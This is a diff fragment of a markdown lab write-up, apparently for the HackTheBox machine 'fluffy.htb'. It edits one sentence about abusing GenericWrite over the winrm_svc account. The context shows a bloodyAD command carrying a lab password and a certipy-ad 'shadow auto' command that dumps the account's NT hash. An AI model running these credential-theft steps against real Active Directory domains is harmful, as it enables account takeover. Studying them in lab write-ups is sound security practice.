@@ -193,7 +193,7 @@ bloodyAD --host DC01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' ad
 
 ### GenericWrite-(winrm_svc)
 
-We can use [**targetedKerberoast.py**](http://targetedkerberoast.py/) here but it will useless sometimes cause maybe hashes are not crackable so lets use `certipy-ad` with `shadow` option we can dump **NT hash** directly. 
+We can use `targetedkerberoast.py` here but it will useless sometimes cause maybe hashes are not crackable so lets use `certipy-ad` with `shadow` option we can dump **NT hash** directly. 
 
 ```bash
 certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
